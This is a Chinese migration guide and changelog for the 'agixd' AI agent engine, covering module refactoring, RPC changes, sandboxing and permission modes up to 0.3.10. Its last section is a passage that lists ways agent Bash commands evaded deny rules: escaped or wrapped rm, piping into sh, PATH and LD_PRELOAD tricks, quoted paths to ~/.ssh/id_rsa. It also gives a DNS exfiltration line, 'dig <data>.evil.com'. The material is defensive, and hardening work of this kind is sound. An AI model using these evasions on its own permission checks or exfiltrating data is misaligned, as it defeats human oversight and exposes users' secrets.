# 从 0.2.x 迁移到 0.3

0.3 把引擎拆成了**内核 + 模块**(`ARCHITECTURE.md` §1):子 agent、MCP、skill 不再
硬编在 `runtime` 里,而是以 `runtime::module::Module` 装进会话。**默认构建的 `agixd`
功能与 0.2.x 相同**,RPC 协议只增不改。要改的是三类人:进程内嵌入引擎的、自己选
cargo feature 构建的、部署 `agixd` 的。

## 进程内嵌入方

### 改名与路径

| 0.2.x | 0.3 |
|---|---|
| `base::interface::scene::AgentScene` | `base::interface::scene::Scene` |
| `scene::scene::{CodingScene, ChatScene, …}`、`scene::scene::SceneRegistry` | `scene::{CodingScene, …}`、`scene::SceneRegistry` |
| `runtime::agent_tool::*` | `agents::agent_tool::*` |
| `runtime::agent_spawner_impl::RuntimeAgentSpawner` | `agents::spawner::RuntimeAgentSpawner` |
| `runtime::agent_tool::{AgentTypeDefinition, AgentTypeSource, parse_permission_mode}` | `base::agent_type::*`(`agents::agent_tool` 也重新导出) |
| `runtime::agent::{build_default_skill_manager, build_skill_manager_unwatched}` | `skills::module::*` |
| `tools::skill_tool::*`、`tools::register_skill_tool` | `skills::tool::*`、`skills::tool::register` |

`CodingScene` 在 0.3.6 改名 `CodeScene`(见「0.3.0 之后:到 0.3.6」)。
| `tools::saas_stubs::McpAuthTool` | 删除(0.3.10 起;OAuth 见 `mcp_auth.md`) |
| `runtime::commands::CommandRegistry::from_skill_manager` | `from_skill_catalog`(收 `Arc<dyn SkillCatalog>`,`Arc<SkillManager>` 直接可传) |
| `agents::agent_tool::AgentTool::set_skill_manager` | `set_skill_catalog` |
| `model::tokens::TiktokenCounter` | `HeuristicCounter`;`estimate_input_tokens` / `estimate_block_tokens` 不再收 BPE 参数 |
| `daemon::{SessionPool, Assembly, config, …}` | 搬到 `assembly` crate;`daemon::…` 路径仍然可用 |

前两行是机械替换:

```sh
grep -rl 'AgentScene\|scene::scene::' --include='*.rs' . \
  | xargs perl -pi -e 's/AgentScene/Scene/g; s/scene::scene::/scene::/g'
```

### `Builder` 不再自带子 agent、skill、MCP

0.2.x 的 `runtime::agent::Builder::build()` 无条件注册 `Agent`、`Team*`、`Skill` 与
MCP 工具。0.3 里它们是模块,要的就装:

```rust
let builder = runtime::agent::Builder::new()
    // …scene / model / settings / tools…
    .module(Arc::new(mcp::McpModule::new(manager)))              // 0.2:.mcp_manager(manager)
    .module(Arc::new(agents::AgentsModule::new()))               // 0.2:自动
    .module(Arc::new(skills::SkillsModule::new()));              // 0.2:自动扫三层目录
```

| 0.2.x | 0.3 |
|---|---|
| `.mcp_manager(m)` | `.module(Arc::new(mcp::McpModule::new(m)))` |
| `.shared_agent_types(h)` | `.module(Arc::new(AgentsModule::new().shared_agent_types(h)))` |
| `.skill_catalog(m)` | `.module(Arc::new(SkillsModule::shared(m)))` |
| `.skill_provider(p)` | `SkillsModule::new().provider(p)` |
| `.mcp_servers(..)` | 删除(从未被读) |
| `Agent::init_mcp_skills()` | 删除(没有调用方);要把 MCP 工具当 skill,调 `SkillManager::register_mcp_skills` |

顺序要按 **mcp → agents → skills** 装:agents 要看到可以授予子 agent 的 MCP 工具,
fork 型 skill 要 agents 提供的 spawner。不装 agents 的会话没有 `Agent` 工具,
`"agent"` 型 hook 与 fork 型 skill 的派生被拒绝;不装 skills 的会话没有 `Skill` 工具与
skill 命令。

`Agent::skills()` 返回 `&dyn SkillCatalog`,`Agent::mcp()` 返回 `&dyn McpServers`
(都在 `base::interface`),不再是具体类型。自己写模块见 `extension_points.md`
「一组能力打成一个模块」。

### 依赖 `tools`、`runtime`、`base` 的 feature

- workspace 里 `tools` 与 `runtime` 的依赖改为 `default-features = false`。`web`
  (WebFetch / WebSearch)与 `structured-output`(StructuredOutput)是 feature;
  要它们的显式打开,例如 `runtime = { …, features = ["web", "structured-output"] }`。
- `base` 新增默认开启的 `http`(本机 HTTP 客户端)。只实现契约、不要 HTTP 栈的 crate
  可以 `default-features = false`。
- 进程内自己构建 reqwest client 的,先调一次
  `base::interface::exec::local::install_tls_provider()`:reqwest 0.13 用 ring,
  没装 provider 时第一个 client 就会 panic。证书根改为系统信任库,企业代理装在
  系统钥匙串里的根证书现在会被信任。

### 子 Agent 的并发与通信

- 前台子 Agent 现在跑在自己的 tokio 任务上(`ARCHITECTURE.md` §3.8),同一轮的几个
  `Agent` 调用、`TeamCreate` 同阶段成员真正并行。自己实现的 `Model`、`Tool`、hook 若
  暗含"子 Agent 与父 Agent 在同一个任务里"的假设(比如用 task-local 传状态),要改。
- 同时在跑的子 Agent 默认最多 6 个(`execution.max_concurrent_subagents`,整棵会话树
  共用),超出的 spawn 返回工具错误。`TeamCreate` 成员与常驻成员不计入。
- 后台子 Agent 结束时,父会话的对话里会多一条 `<task-notification>` 用户消息
  (`MessageOrigin::Injected`)。读 transcript 的代码按 origin 区分它与用户输入。
  自己的代码也可以经 `SessionState::post_notice` 给会话的 Agent 递话。
- `base::context::RunningTask` 新增 `ended`(配 `wait_ended()`)与 `inbox`
  (`TaskInbox`);`runtime::agent::Agent::steer_handle()` 把一个不经 `Agent::run` 驱动
  的 Agent 的 steering 队列交出来。
- 新工具 `TaskWait`、`TaskMessage`,在 `CodingScene`(0.3.6 起叫 `CodeScene`)里延迟
  加载;`TeamCreate` 成员另有 `TeamMemorySave`、`TeamMemoryRead`。
- `team::prompt::WorkerContext` 新增 `team_memory` 字段,结构体字面量要补上(空串即可)。
- `Agent` 工具的 `model` 参数以前被忽略,现在生效,压过 agent 类型的 `model`。
- 子 Agent 的工具输入按它自己的工具校验(带 `output_schema` 的 `StructuredOutput` 以前
  按父会话那个不带 schema 的校验,什么都收);它的权限询问也受
  `permission_prompt_timeout_secs` 约束,超时按拒绝,以前一直等。
- 子 Agent 不再继承父场景 `Scene::extra_tools` 贡献的那份工具,而由自己的场景重新贡献,
  并受 agent 类型的 `allowed_tools` / `disallowed_tools` 约束。
- `RunningTask` 新增 `usage` 与 `structured_output`;`AgentSpawner` 新增有默认实现的
  `start_agent`。自己实现 `AgentSpawner` 的不用改。

### 会话级提示词

`Builder::session_prompt(SessionPrompt { append, override_text })` 给一个会话单独的
追加 / 覆盖提示词,不写任何 settings.json,也不传给它派生的子 Agent。对应 RPC 见下。

### WebSearch 只有一条路

0.2.x 在 Anthropic 协议的提供方上,适配层把 `WebSearch` 从工具表里拿掉,换成提供方自带
的 `web_search` 发出去;提供方搜索的调用又被当成一次普通工具调用交给引擎,结果块被丢掉。
0.3 里 `WebSearch` 在所有提供方下都是引擎的普通工具:模型调它,它另发一次调用让提供方
自己搜,结果作为工具结果回给模型。hook、权限规则、宿主看到的帧与 `inspectContext` 都只
见到 `WebSearch` 这一个名字;代价是每次搜索多一次模型调用。

- 默认用会话自己的模型搜;`task_models.web_search` 可以换一个提供方。没有自带搜索的
  提供方(所有 `openai_compatible` 的)对 `WebSearch` 回错误,说明要怎么配。
- `tools::register_web_search(reg, model, model_name)`:原来收 `&Settings`、自己从
  设置与环境变量拼 HTTP 客户端;`NativeSearchProvider::new(model, model_name)` 同理,
  `from_settings` 与 `UnavailableSearchProvider` 删除。
- `SearchProvider::search` 多一个 `session_id` 参数。
- `StreamParams` 新增 `provider_search`(结构体字面量补 `provider_search: None`);
  `ModelEvent` 新增 `SearchResults`,`ModelError` 新增 `Unsupported`,穷尽匹配要补分支。
  自己实现 `Model` 的,收到 `provider_search` 而做不到时回 `Unsupported`。

### Monitor 真的在后台跑

0.2.x 的 `Monitor` 说是后台监视，实际挡住这一轮直到脚本退出或超时(常驻的一直挂着),
打出的行也没有送到模型,工具结果只有行数。0.3 里它登记成会话的任务后立即返回任务 id;
打出的行 200 毫秒内的合成一条 `<task-notification>`,模型在下一步(或下一轮开头)读到,
没读的通知会并进下一条;脚本退出、超时、事件过多时最后报一次;`TaskStop` /
`session.stopTask` 停掉它,本轮被中断或会话关闭时也一并停掉。宿主经 `task_progress`
边跑边看到它的输出。

### token 估算

`model::tokens` 不再加载 cl100k 词表,改为按字符类估算:相对 cl100k,代码与 JSON
偏高 4–12%,中文偏低约 4%。依赖估算值的阈值(压缩触发)会有小幅变化;真实用量
仍以 API 返回的 usage 为准。需要精确计数的,经 `TokenCounter` 接入自己的实现。

## 自己选 feature 构建 `agixd` 的

`daemon` 的 feature 改按档位组织(`ARCHITECTURE.md` §1.2)。原来的命令一对一换成
带 `full` 的写法,含义不变:

| 0.2.x | 0.3 |
|---|---|
| `cargo build -p daemon` | 不变 |
| `--no-default-features --features plugins` | `--no-default-features --features full,plugins` |
| `--no-default-features --features plugin-compile` | `--no-default-features --features full,plugin-compile` |
| `--no-default-features --features plugin-packages` | `--no-default-features --features full,plugin-packages` |
| `--no-default-features`(两个载体都不带) | `--no-default-features --features full` |

`plugins`、`plugin-compile` 两个 feature 在 0.3.9 删除(见「0.3.8 之后:到 0.3.9」)。

单独 `--no-default-features` 现在是 **minimal** 档:只有内核,没有 MCP、子 agent、
skill、web 工具、WebSocket、载体与包方案。

`release-small` profile(fat LTO、`opt-level = "s"`、`panic = "abort"`)是新增的,
`release` 不变。0.3.8 起 `release-small` 删除,这套配置成了 `release` 本身(见「0.3.7 之后:到 0.3.8」)。

## 部署 `agixd` 的

- `agixd` 处理 SIGTERM,与 Ctrl-C 走同一条正常关闭路径。systemd 单元请用
  `KillMode=process`,让 daemon 自己决定哪些后台命令停、哪些留。
- 用 `release-small`(0.3.8 起是 `--release`)构建的,panic 会中止进程,需要 supervisor 拉起;配置示例、
  崩溃记录(`~/.agix/daemon/crashes/`)与进程组记录(`~/.agix/daemon/groups/`)
  见 `ARCHITECTURE.md` §1.3 与 README 的「Running `agixd`」。
- `--help` 的文字改为简短说明;`--version` 输出 `agixd <版本>`(原先是 `daemon <版本>`)。
  选项与默认值不变。
- 声明式场景:在 `~/.agix/scenes/<id>/` 放 `scene.json` + `prompt.md` 即可定义一个
  场景,经 `scene.activate` / `--scenes` 启用(格式见 `extension_points.md`
  「声明式场景」)。插件包可以用 `[scene] dir` 带一个。

## RPC 客户端

协议只增不改:

- `daemon.ping` / `daemon.status` 增加 `modules`:这个构建编入的模块。
- 在没编入某个模块的构建里,属于它的方法(目前是 `mcp.*` 与 `session.startAgent`)返回 `METHOD_NOT_FOUND`,
  `error.data.module` 指明模块。默认构建不受影响。
- `session.create` 的 `options.prompt` 与 `session.setPrompt`:会话自己的系统提示词,
  从下一轮起生效,重建与重启后保留。
- `scene.reload`、`scene.register`、`scene.unregister`:不重启 daemon 增减场景。
- `session.messageTask`(capability `task_messages`):给运行中的后台子 Agent 发消息。
- 后台子 Agent 结束后,父会话下一次调模型时带着它的 `<task-notification>`,宿主不必
  再替模型轮询 `session.taskOutput`。
- `session.startAgent`(capability `host_agents`):宿主不经模型在会话下起子 Agent;
  新错误码 `TASK_LIMIT`(-32019)。
- 子 Agent 任务的条目多了 `detail.agent_session_id`、`usage`,`session.startAgent` 起的
  还有 `detail.tag` 与 `structured_output`。
- `prompt`、`subagent_progress`、`team_progress`、`skills_changed` 帧在两轮之间也会到,
  `turn_id` 为 `null`。以前它们攒到下一轮开始时才发,而且带着那一轮的 `turn_id`。
  子 Agent 的询问一直是用父会话的 `session_id` 回答。
- 任务边跑边推(capability `task_progress`):新帧 `task_progress`(Shell 命令与监视器
  新增的输出)与 `task_updated`(子 Agent 的用量、等待宿主回答);`subagent_progress`
  多了 `task_id`。子 Agent 有询问在等时,任务的 `status` 是 `waiting`,不认识这个值的
  客户端把它当 `running` 即可。

## 0.3.0 之后:到 0.3.6

0.3.x 之间不改协议版本,下面这些是嵌入方和客户端升级时要看的。

### 嵌入方

- **内置场景只剩 `code`、`harnix`、`mini`。** `coding` 改名 `code`,不留别名,状态目录随之是
  `~/.agix/scenes/code/`;`chat`、`research`、`demo` 删掉,用过它们的改用 `harnix`、`mini`
  或写一个声明式场景。`CodeScene::default()` 是有人值守的,`CodeScene::new(Interaction::Unattended)`
  是无人值守的那一版。
- **`Scene` 新增几个有缺省实现的方法**:`interactive()`(缺省 `false`,即无人值守)、
  `build_session_context()`、`bundled_skills()`、`path_style()`,含义见 `extension_points.md`
  「一个 agent 怎么呈现自己」。**自己写的 Rust 场景升级后缺省就是无人值守**:有人在场的,
  要覆盖 `interactive()` 返回 `true`,否则需要批准的调用会被直接拒绝。声明式场景对应
  `scene.json` 的 `"interactive"`。
- **会话事实不在系统提示里了。** 工作目录、平台、草稿目录由 `build_session_context()` 在会话
  开头作为一条上下文消息注入一次;技能清单(`skills.catalog`)是 `User` 块,每次调用作为对话
  开头的一条消息送出。从系统提示里读这些、或在组装拦截器里按位置找它们的,改成按块名找。
- **`TaskCreate` / `TaskGet` / `TaskList` / `TaskUpdate` 删掉。** "Task"只指运行中的任务
  (子 Agent、Shell 命令、监视器、程序);记账用 `TodoWrite`。`TaskCreated` hook 改在运行任务
  开始时触发。
- **会话目标**:新工具 `GoalCreate` / `GoalGet` / `GoalUpdate`;自己调度 turn 的嵌入方用
  `Builder::goal_rounds_from_owner()` 接管下一轮的开启,见 `extension_points.md`「会话目标」。
- **`RunCode`**:新 crate `ptc`、特性 `ptc`(`coding` 档及以上默认开)。`Tool` 新增
  `callable_from_code()` 与 `code_result()`,缺省不可从程序调;自己的工具要让程序用,覆盖它们。
- **`StructuredOutput`** 在 `code` 场景里只在宿主给了 `output_schema` 时注册;参数就是结果本身,一个字符串字段
  里装着整份符合 schema 的结果时会被拒绝。
- **模型缺省**:thinking 开、`ModelSettings::effort` 缺省 `High`、`max_tokens` 缺省 32000
  (`base::settings::DEFAULT_MAX_TOKENS`)。`StreamParams` 新增 `effort`,结构体字面量补上。
  按 token 计费敏感的部署,在设置里显式写回自己要的值。

### RPC 客户端

- `session.goal` / `session.setGoal` / `session.updateGoal` 与 `goal_changed` 帧;`turn_started`
  的 `initiator` 多了 `goal`。
- `session.tasks` 的 `kind` 多了 `code`(`RunCode` 的程序);不认识的 `kind` 照常显示即可。
- `session.inspectContext` 的 `system` 各块带 `role`。
- 场景 id `coding` 不再存在,`session.create` 带它会得到 `SCENE_NOT_FOUND`。

## 0.3.6 之后:到 0.3.7

### 嵌入方

- **`bypassPermissions` 不看任何权限规则。** `PermissionGate` 在 `validate_input` 之后对 bypass
  直接放行:deny / ask 规则、免 bypass 的路径、`.git` / `.agix` 的确认、工具自己的权限判定
  一概跳过。`~`、`$(`、反引号、UNC 这类会被误读的路径属于输入校验,bypass 下照样拒。
  `agixd` 的 bypass 会话也装规则 gate(这样输入校验、会话中途进计划模式都还在);只有宿主给了
  `Assembly.permission` 才用宿主的。要 deny 仍然算数,用 `acceptEdits` 或 `dontAsk` 加 allow
  规则。只想要"deny 规则挡在前面、其余照旧"的,用 `PermissionGate::deny_rules_only`。
- **`acceptEdits` 只多放行只读调用。** 工具自己没放行的 `Edit` / `Write`(写到根外、写
  `.git` / `.agix` 下)照样询问,无人值守的会话里就是拒绝。
- **沙箱的可写范围收窄了。** 项目的 `.git`、`.agix` 本身,`.git/{config,config.worktree,commondir}`、
  `.git/hooks/`,`.agix` 下的设置与 `mcp`、`hooks`、`agents`、`skills`、`plugins`、`rules`、`scenes`
  等配置目录都只读;`~/.agix` 只有 `base::paths::STATE_ROOT_WORKING_DIRS`(`scratchpad`、`memory`)
  可写;`/private/tmp` 等临时区不再整体放开,沙箱里的命令拿到会话自己的 `TMPDIR`。依赖在沙箱里
  `git config`、`git remote add` 的流程要挪到沙箱外。引擎自己跑的 git 一律带
  `base::frozen::git::ENGINE_GIT_OPTIONS`,会话的命令进沙箱时它也进同一个沙箱,由
  `base::frozen::git::EngineGit` 决定怎么起(`tools::bash::engine_git` / `engine_git_for` 给出
  会话的那一个):`FrozenContext::collect` / `collect_with_options` / `refresh_git` /
  `refresh_git_status` 与 `tools::worktree::create_worktree` / `prune_orphan_worktrees` 多一个
  `&EngineGit` 参数,不想进沙箱的传 `EngineGit::Direct`。`SandboxPolicy` 多了
  `only_additional_writable`;`PlatformSandbox::confine` 包得住任何程序,不再只认 `bash -c`。
- **`Monitor` 进沙箱**,与 `Bash` 共用包装与 `require_enforcement`。
- **自己调度目标轮的**(`Builder::goal_rounds_from_owner()`):一轮开跑前调用
  `SessionState::goal_claim_round(turn_id)`,返回 `false` 就不跑——目标已暂停、清除、改过,或
  这一轮已经有人跑了。同一时刻只会发出一个待跑轮。
- **`AgentSpawner::start_agent` 多一个取消令牌参数**,宿主起的子 Agent 随它取消;会话池传会话的
  子令牌。
- **`Builder::question_prompts(bool)`。** 有人值守的场景里,`AskUserQuestion` 只在打开它、或嵌入方
  自己给了 `.elicitation(...)` 时注册。`base::interface::scene::NEEDS_A_USER` 里的工具由 Builder
  在无人值守场景里统一摘掉,场景不必自己过滤。
- **`settings.compaction.threshold_tokens` / `keep_recent` 生效了**(之前写了没人读),字段改成
  可选,不写就用场景的 `token_budget()`。已经写了这两项的部署,升级后会按写的值压缩。
- **`ModelError::NotRecorded`**:回放的录像里没有这次辅助调用时返回;自己穷举 `ModelError` 的补一支。
  会话自动起名走会话自己的模型与项目绑定,录制时记成 `purpose: "title"` 的辅助调用。
- **`AgentEvent::PermissionPrompt` 带 `task_id`,新增 `AgentEvent::QuestionPrompt`**;穷举匹配
  `AgentEvent` 的补上。`SetModelError::Busy.current_turn_id` 改成 `Option<String>`,并多了
  `running_task_ids`(挡住重建的后台任务)。
- **RunCode**:程序里的 `agent()` 超过子 Agent 并发上限时排队等空槽;程序起的子 Agent 需要询问时
  一律拒绝;`Agent` 的 `background` / `team_name` / `worktree` 从程序里调用被拒绝。`ToolContext`
  多了 `from_code`。
- **`RunningTask` 的输出不再是公开字段。** 写用 `append_output`,读用 `output_text()`(全部保留的)、
  `output_tail(n)` 或 `output_from(偏移)`,后两者返回 `OutputSlice {text, from_byte, next_byte,
  dropped, closed}`;`output_dropped` 去掉了,`from_byte > 0` 就是前面有没给的。`report_progress()`
  不带参数;`finish_task` 关闭输出(`close_output`),之后写的不再记下。`cancel_running_task` 只记下
  停止,`task_finished` 由工作自己走到 `finish_task` 时发,至多等 15 秒。
- **`HistoryStore::snapshot_lineage`**:一个会话连同任意深度的侧链,`session.export` 用它取快照。
  有缺省实现,但缺省是逐个 `load`,不在同一时刻;自己实现 store 的,能挡一下写入就覆盖它。

### RPC 客户端

- **提问**:`session.create` 的 `options.prompt_types` 加上 `"question"`(能力位 `question_prompts`)
  后,模型的 `AskUserQuestion` 以 `prompt_type: "question"` 的 `prompt` 帧到达,用
  `session.respondToPrompt` 的 `answer` 回答;没打开的会话里模型看不到这个工具。
- **能力位**多了 `goals`、`ptc`(带这个特性构建时)、`question_prompts`、`task_output_offsets`。
- **任务输出按字节偏移读**(能力位 `task_output_offsets`):`session.taskOutput` 接受 `from_byte`
  (与 `tail_bytes` 二选一),应答多了 `from_byte` / `next_byte` / `dropped` / `final`;`task_progress`
  帧多了 `from_byte` / `next_byte`。跟随输出的宿主按 `next_byte` 增量拼接,`dropped > 0` 时明示
  中间丢了多少(做法见协议文档 §6.3 `session.taskOutput`)。老 daemon 不认 `from_byte`,会把它当成
  只要尾部 —— 先看能力位。
- **被停掉的任务,`task_finished` 晚到。** `session.stopTask` 之后 `session.tasks` 立刻是 `stopped`,
  `task_finished` 却要等工作收完尾(至多 15 秒),之前还会有带收尾输出的 `task_progress`。拿
  `task_finished` 当"停止已生效"的宿主,改看 `stopTask` 的应答或 `session.tasks`。
- `session.run_turn` 的 `turn_id` 不能是目标轮的形式(`goal-<修订>-<轮次>-…`),也不能以 `schedule-`、`cron-` 开头(`INVALID_PARAMS`)。
- 会话有一轮占着时 `setModel` / `setPrompt` 等需要重建的调用一律 `SESSION_BUSY`,`current_turn_id`
  在那一轮还没正式开始时为 `null`;被拒的改动不会记下。
- 还有后台任务在跑的会话不重建:`setPrompt`、换厂商的 `setModel` 返回 `SESSION_BUSY`,`data`
  多一项 `running_task_ids`;设置文件变化引起的重建推迟到任务都结束之后。重建之后会话结束了的
  任务和还没投给模型的 `<task-notification>` 都还在。
- 后台子 Agent 的询问不随前台一轮结束而从 `pending_prompts` 里消失,答了或任务结束才去掉。
- 同一连接重复 `daemon.subscribeEvents` 不再重复投递。
- **导出**:`session.export {session_id, path, format?, include?}`(能力位 `session_export`)把会话
  连同侧链、图片本体在同一时刻打成 zip 或目录,写到 daemon 所在机器上的绝对路径,带
  `manifest.json`(`format_version: 1`)。还没有 `session.import`。

## 0.3.7 之后:到 0.3.8

### 部署 `agixd` 的

- **`release` 就是小体积构建**:fat LTO、`opt-level = "s"`、`panic = "abort"`,`agixd` 约 11 MB。
  `release-small` profile 没有了,原来用它的改成 `--release`。要 panic 时展开、任务里的 panic
  只结束那个任务的,用 `--profile release-fast`(`opt-level = 3`,体积翻倍)。按 `--release`
  构建的部署现在 panic 会中止进程,需要 supervisor 拉起(`ARCHITECTURE.md` §1.3)。
- **工作线程数可配**:`--worker-threads <N>` 或环境变量 `AGIX_WORKER_THREADS`(命令行优先),
  不配时等于 CPU 核数。只管异步工作线程;文件读写、搜索、脚本走各自的阻塞线程池,不受影响。
  嵌入式板子上 `--worker-threads 1` 即可。

## 0.3.8 之后:到 0.3.9

扩展只剩两种:编译进宿主的 Rust 插件,和 QuickJS 脚本(与 `RunCode` 同一套虚拟机)。
WebAssembly 载体整个移除。

### 自己选 feature 构建 `agixd` 的

- `plugins`、`plugin-compile` 两个 feature 没有了,`agix-plugin-compile` 二进制也没有了。
  原来用 `--no-default-features --features full,plugin-compile` 的构建,改回默认构建。
- `scripts` 与插件包不再互斥:默认构建两样都带。

### 插件包作者

- `[[wasm]]` 段**拒装**,安装时报错。给宿主看的内容放 `x-` 前缀的段。
- `[scene.own]` 段**拒装**,改用 `[scene] dir`(`scene.json` + `prompt.md`,格式见
  `extension_points.md`「声明式场景」),它是 `own` 的超集。`[scene] visible_in` 删除。
- `[plugin.config]` 不再读取(它只服务组件的 `init`)。
- `[[agent]]` 现在在默认构建上生效;以前只有带 WASM 载体的构建兑现它。
- 包格式见新的 `plugin_packages.md`;`extending_wasm.md` 删除。

### 嵌入方

- `crates/wasm-host`、`crates/plugin-host`、`crates/plugin-compiler` 删除;
  `base::interface::capabilities` 删除(它只服务 WASM 组件的能力声明)。
- `hooks::config::HookConfig::Wasm`、`hooks::runner::WasmHookExecutor`、
  `HookRunner::with_wasm_executor`、`PluginHost::hook_executor` 删除。
- `SessionPool::load_plugin_components` 改名 `load_plugins`(现在只接管插件包的场景)。
- `plugin::locate::locate_tool` 删除。
- **Rust 插件接口定为 `runtime::plugin::Plugin`**:`Builder::plugin(..)` 可以加多个,
  `Assembly { plugins, .. }` 加给池里每个会话;插件随会话一起交给子 Agent。
  `runtime::plugin_host::PluginHost` 与 `Builder::plugin_host` 删除;只为加几个工具实现
  `PluginHost` 的,改成一个只调 `Registrar::tool` 的 `Plugin`。
- **同一个点上 Rust 与 QuickJS 的先后对调了。** 以前串行的点上(`tool.result`、
  `model.request`、`model.message`、`memory.retrieval_hook`)脚本碰巧跑在 `SessionCustomizer`
  加的 Rust 实现**之前**;现在 Rust 先、脚本后,与交给 `Builder` 的先后无关。`tool.around`
  上脚本仍在外层。见 `extension_points.md`「叠加顺序」。
- 在 `SessionCustomizer` 里设 `Builder::prompt_registry` 不再把脚本的块、变量、组装钩子
  冲掉:脚本叠在宿主的注册表上。
- **QuickJS 也走 `Plugin`。** `Builder::bound_scripts`、`Builder::script_carriers` 删除,改成
  `builder.plugin(Arc::new(script_host::ScriptPlugin::new(bound)))`;`AgentTool::with_delegate_scripts`
  删除,子 Agent 随插件继承。
- `Plugin` 有 `name`、`layer`(默认 `Layer::Rust`)、`register` 三个方法。插件名在会话里唯一;
  工具名、agent 类型名跨插件唯一;提示块名与变量名同层唯一——撞了 `build()` 失败。
  脚本之间撞名在绑定时报 `BindingError::NameTaken`。
- `runtime::module::SessionContext` 的 `plugin_host`、`delegate_scripts` 字段删除,换成
  `plugin_agent_types`、`delegate_plugins` 与 `plugin_tools`。
- `BoundScripts::prompt_variables` 的元素多了第三项 `BlockOrigin`。
- `Builder::scene_tool_filter` 改名 `contributed_tool_filter`,现在也收窄插件登记的工具。
  子 Agent 不再从父会话抄插件的工具,由它自己那次登记给出;`AgentTool::with_delegate_plugins`
  多一个参数,是这些插件在父会话登记的工具名。
- `plugin` crate 收拢成包的格式、发现、缓存、安装与披露:
  - `plugin::cli`、`plugin::marketplace`、`plugin::resolver` 删除(按名字从市场安装、`update`、
    依赖解析,daemon 从未接上);
  - `plugin::fetch` 改名 `plugin::install`,`install(cache, name, source)` 与
    `uninstall(cache, name, version)` 是函数,`PluginSource` 也挪到这里;
  - `plugin::homograph` 改名 `plugin::blocklist`,只留 `check_blocklist`;
    `PluginError::Homograph` 改名 `PluginError::Blocked`;
  - `PluginCache` 去掉 `cache_registry_index`、`load_registry_index`、`total_cached`。
- `assembly::plugins::PluginSubsystem::new` 去掉没用的工作区参数。
- 两种插件的开发指南是新的 `plugin_development.md`,样例在 `examples/plugins/`。

### RPC 客户端

- `plugin.install` 的 `disclosure` 去掉 `wasm`(`components` / `runnable`)与 `events`。
- `plugin.list` 的条目去掉 `component_faults`。
- `daemon.doctor` 的 `plugins.status` 不再出现 `packages-only`;带插件包的构建报 `enabled`。
- `session.get` 多一个 `health`:会话的插件注册了健康检查时才有。

## 0.3.9 之后:到 0.3.10

### 部署 `agixd` 的、RPC 客户端

- **`auto`、`yolo` 就是 `bypassPermissions`。** settings.json 的 `permission_mode`、
  `options.permission_mode`、agent 类型 frontmatter 里写这两个,得到的都是完全放行,报回来是
  `bypassPermissions`。以前 settings.json 里的 `auto` 被退回 `default`,`yolo` 与经 RPC 传进来的
  `auto` 实际按 `default` 询问——配了它们的现在不再询问。只想少问几句的,用 `acceptEdits`
  或 `default` 加 allow 规则。
- Agent 工具(团队成员)和 `TeamCreate` 的 `permission_mode` 不再拒收 `auto`,按
  `bypassPermissions` 处理;`bubble` 照旧拒收。
- `ExitPlanMode` 回到 `EnterPlanMode` 之前的模式,不再一律回 `default`。
- 计划模式里的 `ExitPlanMode` 不再被"plan mode forbids non-readonly tools"拒掉,而是照常询问
  (`prompt`,`tool_name: "ExitPlanMode"`):`permit` 退出,`deny` 留在计划模式。以前计划模式
  经 RPC 退不出来。
- `session.resume` 对活着的会话报它此刻的 `permission.mode`(进了、退了计划模式之后的),
  不再报建会话时的。
- `Bash` 的 deny / ask 规则按实际启动的程序再比一次(`"rm"`、`\rm`、`{rm,x}`、`/bin/rm`、
  `command -p rm`、`env` / `exec` / `sudo` / `nice` / `time` / `timeout` / `xargs` 包着的、
  `sh -c` / `eval` / `find -exec` 里的都算 `rm`);程序名读不出来的命令(`$CMD x`)在有带
  内容的 deny / ask 规则时改为询问(`dontAsk` 下拒绝)。以前它们按原文前缀匹配,都绕得过去。
  allow 规则不变。带引号的受保护路径(`~/".ssh"/id_rsa`)同样按受保护路径拒绝。
- 只读 `Bash` 命令的免询问更窄:参数里有 `$VAR`、`~`、替换的,`cd` / `pushd` 到不是项目内
  字面路径之后再读的,现在要询问。`echo $HOME` 这类也在其中。`cd -`、`popd`、`pushd +N`(落到
  `$OLDPWD` / 目录栈,命令没写出目的地)之后再按相对路径读的,同样要询问。
- 只读白名单里会**拉起别的程序**的命令不再免询问:`rg --pre` / `--search-zip` / `-z`、
  `fd -x` / `-X` / `--exec` / `--exec-batch`、`git grep -O`、`man -P` / `-H`、`bat --pager`、
  `sort --compress-program`,以及 `git -c …`(能设 `core.pager` / `core.fsmonitor` / 外部 diff)、
  `git log --ext-diff`。`cargo build` / `cargo check`(会跑 `build.rs` 与过程宏)移出只读前缀。
  设 `PATH` / `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PAGER` / `MANPAGER` / `GIT_PAGER` /
  `LESSOPEN` 等变量(`PAGER=sh man ls`、`PATH=.; ls`)也一样要询问。
- 只读白名单里会**写文件 / 改仓库**的命令不再免询问:`sort` / `shuf` / `tree` 带 `-o`、
  `uniq` / `xxd` 带第二个位置参数、`yq -i`,以及 `git config` 带值(或 `--unset` / `--add` /
  `--edit` / `set`)、`git branch -d/-D/-m/-f/-u/<新名>`、`git tag -d/<新名>`、
  `git remote add/remove/set-url/rename/prune`、`git diff/log/show --output`。`git config key`
  (读)、`git branch` / `git tag` / `git remote` 的列示形式仍是只读。
- `mcp.addServer` / `mcp.updateServer` 不再把密钥写进要提交的 settings.json:`config` 的
  `headers` 与 `env` 写进同目录的 `settings.local.json`(0600),其余照旧写 settings.json,响应多了
  `secrets_written_to`(改了 settings.local.json 时才有)。settings.json 里这个 server 早先写进去的
  `headers` / `env` 在下次写它时被替换掉;已经提交过的,记得轮换。`mcp.updateServer` 认只在
  settings.local.json 里声明的 server。
- `--features otel` 构建的 OTLP/HTTP 导出(端口不是 4317 的端点)以前什么也没发出去——没有
  HTTP 客户端,建导出器时就失败了,只记一条 warn。现在照常发送,端点按 collector 的根地址处理:
  trace 发到 `<端点>/v1/traces`,指标发到 `<端点>/v1/metrics`。原来写成
  `http://collector:4318/v1/traces` 这种带信号路径的,改成根地址。
- `turn_complete` 多了可选的 `truncated: true`:OpenAI 兼容的流既没有 `[DONE]` 也没有
  `finish_reason` 就关了时出现(仍当作回复结束,daemon 另记一条 warn),回复可能不完整;遥测
  `api_request` 上同样标 `truncated: true`。其余情况没有这个键。
- `dig`、`ping` 移出只读白名单,走正常的权限判定(`default` 下询问)。它们按参数里的主机名
  发 DNS 查询,`dig <编码后的数据>.evil.com` 就能把数据带出去。要免询问的,写
  `Bash(dig:*)` / `Bash(ping:*)` 这类 allow 规则。
- `Bash` 的 deny / ask 规则多了几种绕法的识别:`case`/`function`/`select` 块、读 stdin /
  here-string 的裸 `sh` / `bash`(`echo 'rm' | sh`、`bash <<< 'rm'`)程序名读不出来,有带内容的
